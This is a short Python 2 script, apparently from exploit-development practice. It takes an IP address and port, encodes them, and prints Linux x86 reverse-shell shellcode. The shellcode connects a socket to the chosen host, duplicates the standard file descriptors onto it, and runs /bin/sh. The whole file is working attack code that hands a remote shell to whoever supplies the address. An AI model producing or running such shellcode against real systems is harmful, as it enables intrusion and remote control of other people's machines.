import struct
import sys
import socket
import binascii

def main():
	if len(sys.argv) != 3:
		print "Usage: {0} IP PORT".format(sys.argv[0])
		exit()

	ip = sys.argv[1]
	
	port = int(sys.argv[2])
	# bounds checking
	if not (0 <= port <= 65535):
		print "That's not a real port number!"
		exit()

	# check well known ports
	if port <= 1024:
		print "Reminder: Well known port needs to be run as root"
	
	ip = socket.inet_aton(ip)	
	ip = binascii.hexlify(ip)
	ip = '\\x'+ip[0:2]+'\\x'+ ip[2:4] + '\\x' + ip[4:6] + '\\x' + ip[6:]

	port = r'\x' + r'\x'.join(x.encode('hex') for x in struct.pack('!H', port))	

	# check nulls
	if r'\x00' in ip:
		print 'Null in that ip. Try again.'
		exit()
	if r'\x00' in port:
		print 'Null in that port number. Try again.'
		exit()

	shellcode = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\xb0\\x66\\xb3\\x01\\x51\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x43\\x68" + ip + "\\x66\\x68" + port + "\\x66\\x53\\x43\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x89\\xfb\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xb0\\x0b\\xcd\\x80"


	print "Shellcode: " + shellcode
	
if __name__=="__main__":
	main()
